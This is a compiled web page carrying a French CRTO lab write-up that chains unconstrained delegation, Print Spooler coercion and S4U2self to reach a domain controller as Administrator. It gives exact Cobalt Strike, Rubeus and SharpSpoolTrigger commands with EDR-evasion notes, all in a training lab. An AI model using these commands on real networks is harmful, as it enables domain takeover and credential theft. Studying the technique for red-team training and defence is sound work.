import{_ as s,o as t,c as o,an as a}from"./chunks/framework.CQDbILCq.js";const h=JSON.parse('{"title":"Lab - S4U2self","description":"","frontmatter":{"pageClass":"crto-page","prev":false,"next":false},"headers":[],"relativePath":"crto/liham/labs/S4U2self-lab.md","filePath":"crto/liham/labs/S4U2self-lab.md"}'),n={name:"crto/liham/labs/S4U2self-lab.md"};function i(c,e,r,l,d,p){return t(),o("div",null,e[0]||(e[0]=[a(`<h1 id="lab-s4u2self" tabindex="-1">Lab - S4U2self <a class="header-anchor" href="#lab-s4u2self" aria-label="Permalink to &quot;Lab - S4U2self&quot;">​</a></h1><blockquote><p>L&#39;objectif est de présenter <strong>S4U2self</strong> à partir du TGT d&#39;un compte ordinateur.</p></blockquote><p><strong>Principe :</strong> S4U2self permet à un service de demander un ticket pour <em>lui-même</em> au nom d&#39;un utilisateur, sans posséder son TGT ni son mot de passe. Combiné à <strong>Unconstrained Delegation</strong> et à un déclencheur d&#39;authentification forcée (<code>SpoolSample</code>), le scénario récupère le TGT du compte machine DC, puis utilise <code>krb_s4u /self</code> pour obtenir un service ticket <code>cifs</code> avec impersonation Domain Admin. Le TGT du compte machine DC seul ne suffit pas pour accéder aux fichiers : S4U2self permet d&#39;obtenir le service ticket nécessaire.</p><hr><h2 id="enumeration" tabindex="-1">Énumération <a class="header-anchor" href="#enumeration" aria-label="Permalink to &quot;Énumération&quot;">​</a></h2><ol><li><p>Lancer Cobalt Strike et se connecter au team server.</p></li><li><p>Rechercher les ordinateurs avec <strong>Unconstrained Delegation</strong> (hors DC dans ce scénario) :</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ldapsearch (&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName</span></span></code></pre></div></li></ol><blockquote><p>OPSEC-🟢SAFE - BOF exécuté dans le thread du Beacon, sans child process.</p></blockquote><p>⚠️ Résultat attendu : <code>lon-ws-1$</code> - l&#39;hôte disposant d&#39;Unconstrained Delegation utilisé pour le pivoting.</p><ol start="3"><li>Effectuer une impersonation de l&#39;utilisateur <code>rsteel</code>, puis un Lateral Movement vers <code>lon-ws-1</code>.</li></ol><hr><h2 id="lateral-movement-vers-lon-ws-1" tabindex="-1">Lateral Movement vers lon-ws-1 <a class="header-anchor" href="#lateral-movement-vers-lon-ws-1" aria-label="Permalink to &quot;Lateral Movement vers lon-ws-1&quot;">​</a></h2><p>Objectif : obtenir un Beacon sur <code>lon-ws-1</code>. SYSTEM n&#39;est <strong>pas</strong> strictement nécessaire pour toutes les étapes : Rubeus monitor passe par <code>execute-assembly</code>. Cependant, <code>winrm64</code> donne un Beacon sous <code>rsteel</code> (pas SYSTEM). Les notes prévoient <code>getsystem</code>, puis <code>rev2self</code> avant Rubeus monitor (voir étape 1).</p><h3 id="option-a-steal-token-privilegie-opsec-🟢safe" tabindex="-1">Option A - steal_token (privilégié, OPSEC-🟢SAFE) <a class="header-anchor" href="#option-a-steal-token-privilegie-opsec-🟢safe" aria-label="Permalink to &quot;Option A - steal_token (privilégié, OPSEC-🟢SAFE)&quot;">​</a></h3><ol><li><p>Sur le Beacon actuel, utiliser <code>ps</code> ou <code>process_browser</code> pour chercher un processus appartenant à <code>rsteel</code> :</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ps</span></span></code></pre></div><p>Rechercher <code>cmd.exe</code> ou <code>mmc.exe</code> exécuté par <code>CONTOSO\\rsteel</code>.</p></li><li><p>Récupérer le token :</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>steal_token &lt;rsteel-pid&gt;</span></span></code></pre></div></li></ol><blockquote><p>OPSEC-🟢SAFE - duplication de token dans le thread Beacon, sans événement logon ni child process.</p></blockquote><ol start="3"><li><p>Configurer <code>spawnto</code> avant le jump :</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ak-settings spawnto_x64 C:\\Windows\\System32\\dllhost.exe</span></span></code></pre></div></li></ol><blockquote><p>OPSEC-🟠CAUTION - définit le processus temporaire utilisé par fork &amp; run. <code>dllhost.exe</code> se confond avec l&#39;activité d&#39;un COM surrogate dans ce scénario.</p></blockquote><ol start="4"><li><p>Effectuer le jump vers lon-ws-1 :</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>jump winrm64 lon-ws-1 smb_custom</span></span></code></pre></div></li></ol><blockquote><p>OPSEC-🟢SAFE - WinRM, sans modification de service ni écriture disque, et sans Event 7045 d&#39;après ces notes.</p></blockquote><ol start="5"><li><p>Abandonner le token sur le Beacon source une fois le jump réussi :</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>rev2self</span></span></code></pre></div></li></ol><h3 id="option-b-make-token-kerberos-ticket-use-si-aucun-processus-rsteel-n-est-visible" tabindex="-1">Option B - make_token + kerberos_ticket_use (si aucun processus rsteel n&#39;est visible) <a class="header-anchor" href="#option-b-make-token-kerberos-ticket-use-si-aucun-processus-rsteel-n-est-visible" aria-label="Permalink to &quot;Option B - make_token + kerberos_ticket_use (si aucun processus rsteel n&#39;est visible)&quot;">​</a></h3><ol><li><p>Récupérer le TGT de <code>rsteel</code> depuis la session en cache :</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>krb_triage</span></span>
<span class="line"><span>krb_dump /user:rsteel /service:krbtgt</span></span></code></pre></div></li></ol><blockquote><p>OPSEC-🟠CAUTION - Appel à l&#39;API Kerberos <code>LsaCallAuthenticationPackage</code>, sans lecture directe de la mémoire LSASS.</p></blockquote><ol start="2"><li><p>Enregistrer le TGT Base64 au format <code>.kirbi</code> sur <strong>l&#39;Attacker Desktop</strong>, via PowerShell local et non le Beacon :</p><div class="language-powershell vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">[</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">IO.File</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">]::WriteAllBytes(</span><span style="--shiki-light:#032F62;--shiki-dark:#A5D6FF;">&quot;C:\\Users\\Attacker\\Desktop\\rsteel.kirbi&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">,</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;"> [</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">Convert</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">]::FromBase64String(</span><span style="--shiki-light:#032F62;--shiki-dark:#A5D6FF;">&quot;[BASE64-TGT]&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">))</span></span></code></pre></div></li></ol><blockquote><p>⚠️ Lab-confirmed (2026-04-19): <code>kerberos_ticket_use</code> nécessite un <strong>chemin de fichier</strong> ; fournir directement le Base64 provoque l&#39;erreur <code>does not exist</code>.</p></blockquote><ol start="3"><li><p>Créer une session de logon temporaire et injecter le TGT :</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>make_token CONTOSO\\rsteel FakePass</span></span>
<span class="line"><span>kerberos_ticket_use C:\\Users\\Attacker\\Desktop\\rsteel.kirbi</span></span></code></pre></div></li></ol><blockquote><p>OPSEC-🟠CAUTION - <code>make_token</code> génère l&#39;Event 4648.</p></blockquote><ol start="4"><li><p>Effectuer le jump vers lon-ws-1 :</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>jump winrm64 lon-ws-1 smb_custom</span></span></code></pre></div></li><li><p>Abandonner le token et purger les tickets du Beacon source :</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>rev2self</span></span>
<span class="line"><span>kerberos_ticket_purge</span></span></code></pre></div></li></ol><h3 id="depuis-le-nouveau-beacon-lon-ws-1" tabindex="-1">Depuis le nouveau Beacon lon-ws-1 <a class="header-anchor" href="#depuis-le-nouveau-beacon-lon-ws-1" aria-label="Permalink to &quot;Depuis le nouveau Beacon lon-ws-1&quot;">​</a></h3><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>getuid</span></span></code></pre></div><blockquote><p>⚠️ Lab-confirmed (2026-04-19): <code>jump winrm64</code> donne une session sous <code>CONTOSO\\rsteel</code> (pas SYSTEM) - WinRM injecte dans <code>wsmprovhost.exe</code> exécuté sous l&#39;utilisateur authentifié. Le lab demande un contexte SYSTEM avant Rubeus monitor. Utiliser <code>getsystem</code> :</p></blockquote><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>getsystem</span></span>
<span class="line"><span>getuid    # confirm NT AUTHORITY\\SYSTEM</span></span></code></pre></div><blockquote><p>OPSEC-🟠CAUTION - <code>getsystem</code> utilise une impersonation par named pipe depuis un contexte administrateur.</p></blockquote><hr><h2 id="exploitation" tabindex="-1">Exploitation <a class="header-anchor" href="#exploitation" aria-label="Permalink to &quot;Exploitation&quot;">​</a></h2><h3 id="etape-1-demarrer-rubeus-monitor-sur-lon-ws-1" tabindex="-1">Étape 1 - Démarrer Rubeus monitor sur lon-ws-1 <a class="header-anchor" href="#etape-1-demarrer-rubeus-monitor-sur-lon-ws-1" aria-label="Permalink to &quot;Étape 1 - Démarrer Rubeus monitor sur lon-ws-1&quot;">​</a></h3><p>Surveille l&#39;arrivée des TGT via SSPI, sans lecture directe de la mémoire LSASS.</p><blockquote><p>⚠️ Lab-confirmed (2026-04-19): <code>execute-assembly</code> <strong>échoue avec « No .NET runtime found »</strong> juste après <code>getsystem</code>. Le token d&#39;impersonation obtenu par <code>getsystem</code> perturbe le processus hôte .NET de fork &amp; run. Solution relevée : exécuter <code>rev2self</code>, puis lancer Rubeus monitor :</p></blockquote><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>rev2self</span></span>
<span class="line"><span>execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe monitor /interval:3 /targetuser:lon-dc-1$ /nowrap</span></span></code></pre></div><blockquote><p>OPSEC-🟠CAUTION - fork &amp; run dans <code>dllhost.exe</code> (<code>spawnto</code> défini plus haut). La capture des tickets utilise les API Windows SSPI/Kerberos, sans accès direct à la mémoire LSASS. <code>/targetuser</code> filtre les résultats pour ne conserver que le compte machine DC.</p></blockquote><blockquote><p>⚠️ Après <code>rev2self</code>, le Beacon revient dans le contexte <code>rsteel</code> : c&#39;est attendu. Rubeus monitor s&#39;exécute dans un processus temporaire et capture les tickets indépendamment du contexte d&#39;impersonation du Beacon.</p></blockquote><hr><h3 id="etape-2-forcer-une-authentification-de-lon-dc-1-vers-lon-ws-1" tabindex="-1">Étape 2 - Forcer une authentification de lon-dc-1 vers lon-ws-1 <a class="header-anchor" href="#etape-2-forcer-une-authentification-de-lon-dc-1-vers-lon-ws-1" aria-label="Permalink to &quot;Étape 2 - Forcer une authentification de lon-dc-1 vers lon-ws-1&quot;">​</a></h3><p>Déclenche une authentification du service Print Spooler de <code>lon-dc-1</code> via MS-RPRN vers <code>lon-ws-1</code>.</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>execute-assembly C:\\Tools\\SharpSystemTriggers\\SharpSpoolTrigger\\bin\\Release\\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1</span></span></code></pre></div><blockquote><p>OPSEC-🟠CAUTION - fork &amp; run. D&#39;après les notes, génère un événement logon 4648 sur <code>lon-dc-1</code> et du trafic RPC MS-RPRN. Le service Print Spooler doit être actif sur le DC.</p></blockquote><blockquote><p>⚠️ Lab-confirmed (2026-04-19): SharpSpoolTrigger peut renvoyer <code>[-]RpcRemoteFindFirstPrinterChangeNotificationEx status: 6</code> (ERROR_INVALID_HANDLE) sur les deux tentatives. Malgré cette erreur, Rubeus monitor a <strong>tout de même capturé le TGT du DC</strong> - l&#39;hôte en Unconstrained Delegation peut avoir déjà reçu ce TGT lors d&#39;une authentification précédente du DC. Si Rubeus monitor affiche le TGT de <code>lon-dc-1$</code>, le lab peut continuer malgré l&#39;erreur SpoolTrigger.</p></blockquote><p>⚠️ La sortie de Rubeus monitor doit contenir le TGT de <code>LON-DC-1$</code>. Copier le ticket Base64 complet et le renseigner <strong>directement dans la commande <code>krb_s4u</code></strong> ci-dessous. Aucune écriture de fichier n&#39;est nécessaire à cette étape.</p><hr><h3 id="etape-3-obtenir-un-service-ticket-cifs-avec-s4u2self" tabindex="-1">Étape 3 - Obtenir un service ticket CIFS avec S4U2self <a class="header-anchor" href="#etape-3-obtenir-un-service-ticket-cifs-avec-s4u2self" aria-label="Permalink to &quot;Étape 3 - Obtenir un service ticket CIFS avec S4U2self&quot;">​</a></h3><p>Le TGT du compte machine DC ne permet pas directement l&#39;accès aux fichiers. Utiliser <code>krb_s4u /self</code> pour obtenir un service ticket <code>cifs</code> avec impersonation d&#39;Administrator.</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>krb_s4u /ticket:[paste-base64-DC-TGT-here] /self /altservice:cifs/lon-dc-1 /impersonateuser:Administrator</span></span></code></pre></div><blockquote><p>OPSEC-🟢SAFE - <code>krb_s4u</code> est un BOF exécuté dans le thread du Beacon, sans child process ni écriture sur disque.</p></blockquote><blockquote><p>⚠️ Lab-confirmed (2026-04-19): La commande a réussi dans le lab. La sortie confirme :</p><ul><li><code>[*] Building S4U2self request for: &#39;LON-DC-1$@CONTOSO.COM&#39;</code></li><li><code>[+] S4U2self success!</code></li><li><code>[*] Substituting alternative service name &#39;cifs/lon-dc-1&#39;</code></li><li><code>[*] Got a TGS for &#39;Administrator&#39; to &#39;cifs@CONTOSO.COM&#39;</code></li></ul></blockquote><p>⚠️ <code>krb_s4u</code> renvoie un <strong>nouveau service ticket</strong> Base64, différent du TGT du DC. Copier ce nouveau Base64 pour l&#39;enregistrer en <code>.kirbi</code> à l&#39;étape 4.</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>Rubeus monitor output  →  base64 DC TGT       →  paste into krb_s4u</span></span>
<span class="line"><span>krb_s4u output         →  base64 cifs ticket  →  WriteAllBytes → .kirbi → kerberos_ticket_use</span></span></code></pre></div><hr><h3 id="etape-4-enregistrer-le-service-ticket-sur-l-attacker-desktop" tabindex="-1">Étape 4 - Enregistrer le service ticket sur l&#39;Attacker Desktop <a class="header-anchor" href="#etape-4-enregistrer-le-service-ticket-sur-l-attacker-desktop" aria-label="Permalink to &quot;Étape 4 - Enregistrer le service ticket sur l&#39;Attacker Desktop&quot;">​</a></h3><p>Exécuter depuis le client Cobalt Strike sur l&#39;Attacker Desktop (PowerShell local, <strong>pas</strong> le Beacon) :</p><div class="language-powershell vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">[</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">IO.File</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">]::WriteAllBytes(</span><span style="--shiki-light:#032F62;--shiki-dark:#A5D6FF;">&quot;C:\\Users\\Attacker\\Desktop\\cifs-lon-dc-1.kirbi&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">,</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;"> [</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">Convert</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">]::FromBase64String(</span><span style="--shiki-light:#032F62;--shiki-dark:#A5D6FF;">&quot;[BASE64-SERVICE-TICKET]&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">))</span></span></code></pre></div><blockquote><p>Le fichier <code>.kirbi</code> est écrit <strong>uniquement sur l&#39;Attacker Desktop</strong>, sans toucher au disque cible. <code>kerberos_ticket_use</code> lit le fichier depuis le client Cobalt Strike et l&#39;injecte via le canal C2.</p></blockquote><blockquote><p>⚠️ Lab-confirmed (2026-04-19): <code>kerberos_ticket_use</code> requires a <strong>file path</strong> - fournir directement le Base64 brut provoque l&#39;erreur <code>&#39;C:\\Tools\\cobaltstrike\\client\\[base64...]&#39; does not exist</code>. Enregistrer d&#39;abord le fichier <code>.kirbi</code>, puis utiliser son chemin.</p></blockquote><hr><h3 id="etape-5-injecter-le-ticket-et-acceder-au-partage" tabindex="-1">Étape 5 - Injecter le ticket et accéder au partage <a class="header-anchor" href="#etape-5-injecter-le-ticket-et-acceder-au-partage" aria-label="Permalink to &quot;Étape 5 - Injecter le ticket et accéder au partage&quot;">​</a></h3><p>Revenir dans le Beacon de <strong><code>lon-ws-1</code></strong>, et non celui de <code>lon-dc-1</code>, accessible à distance avec le ticket :</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>// Option A - skip make_token (OPSEC-🟢SAFE - no Event 4648, preferred)</span></span>
<span class="line"><span>kerberos_ticket_use C:\\Users\\Attacker\\Desktop\\cifs-lon-dc-1.kirbi</span></span>
<span class="line"><span>ls \\\\lon-dc-1\\c$</span></span>
<span class="line"><span></span></span>
<span class="line"><span>// Option B - with make_token (OPSEC-🟠CAUTION - Event 4648, cleaner session)</span></span>
<span class="line"><span>make_token CONTOSO\\Administrator FakePass</span></span>
<span class="line"><span>kerberos_ticket_use C:\\Users\\Attacker\\Desktop\\cifs-lon-dc-1.kirbi</span></span>
<span class="line"><span>ls \\\\lon-dc-1\\c$</span></span></code></pre></div><blockquote><p>OPSEC-🟢SAFE - <code>kerberos_ticket_use</code> injecte le ticket dans la session de logon courante. <code>make_token</code> est facultatif dans ce lab : le serveur distant valide le ticket Kerberos, plutôt que l&#39;identité locale de la session.</p></blockquote><p>⚠️ <code>ls \\\\lon-dc-1\\c$</code> doit fonctionner. En cas de <code>ACCESS_DENIED</code>, vérifier :</p><ul><li><code>getuid</code> - vérifier le token courant</li><li><code>run klist</code> - vérifier la présence du ticket <code>cifs/lon-dc-1</code> dans la session (note: <code>run klist</code> crée un child process, à réserver à une vérification ponctuelle)</li><li>Le SPN de <code>krb_s4u</code> doit correspondre exactement à <code>cifs/lon-dc-1</code></li></ul><p>Terminer l&#39;impersonation et purger les tickets après utilisation :</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>rev2self</span></span>
<span class="line"><span>kerberos_ticket_purge</span></span></code></pre></div><hr><p>⚠️ Ce lab montre l&#39;association de l&#39;Unconstrained Delegation, de déclencheurs d&#39;authentification et de S4U2self pour accéder au Domain Controller <code>lon-dc-1</code> - en obtenant un service ticket <code>cifs</code> depuis le TGT du compte machine, sans lecture directe de LSASS.</p><hr><h2 id="observations-du-lab-2026-04-19" tabindex="-1">Observations du lab (2026-04-19) <a class="header-anchor" href="#observations-du-lab-2026-04-19" aria-label="Permalink to &quot;Observations du lab (2026-04-19)&quot;">​</a></h2><table tabindex="0"><thead><tr><th>Observation</th><th>Détail</th></tr></thead><tbody><tr><td><code>kerberos_ticket_use</code> rejects raw base64</td><td>Passer directement le Base64 échoue : Cobalt Strike l&#39;interprète comme un chemin et renvoie <code>does not exist</code>. Enregistrer d&#39;abord le <code>.kirbi</code>.</td></tr><tr><td><code>getsystem</code> breaks <code>execute-assembly</code></td><td>Après <code>getsystem</code>, Rubeus monitor échoue : <code>No .NET runtime found</code>. Exécuter <code>rev2self</code> avant <code>execute-assembly</code>. Rubeus monitor fonctionne dans le contexte administrateur <code>rsteel</code>.</td></tr><tr><td><code>jump winrm64</code> lands as rsteel</td><td>WinRM injecte dans <code>wsmprovhost.exe</code> sous l&#39;utilisateur authentifié, et non SYSTEM. <code>getsystem</code> needed for SYSTEM context, but <code>rev2self</code> required before Rubeus.</td></tr><tr><td>SharpSpoolTrigger <code>status: 6</code></td><td><code>RpcRemoteFindFirstPrinterChangeNotificationEx status: 6</code> = ERROR_INVALID_HANDLE. Les deux tentatives ont renvoyé cette erreur. Rubeus monitor a malgré tout récupéré le TGT du DC, déjà en cache après une authentification précédente.</td></tr><tr><td><code>smb_custom</code> listener worked first attempt</td><td>Aucun retry nécessaire avec un nom de pipe personnalisé (contrairement au <code>TSVCPIPE-*</code> par défaut).</td></tr><tr><td><code>krb_s4u /self</code> succeeded</td><td>LON-DC-1$ TGT → <code>cifs/lon-dc-1</code> service ticket for Administrator. Le déroulement de S4U2self a été confirmé de bout en bout.</td></tr><tr><td>EDR on lon-ws-1</td><td>Elastic Endpoint, MsMpEng et Sysmon64 sont présents ; ce lab prévoit <code>spawnto</code> personnalisé et un SMB pipe dédié.</td></tr></tbody></table>`,76)]))}const k=s(n,[["render",i]]);export{h as __pageData,k as default};
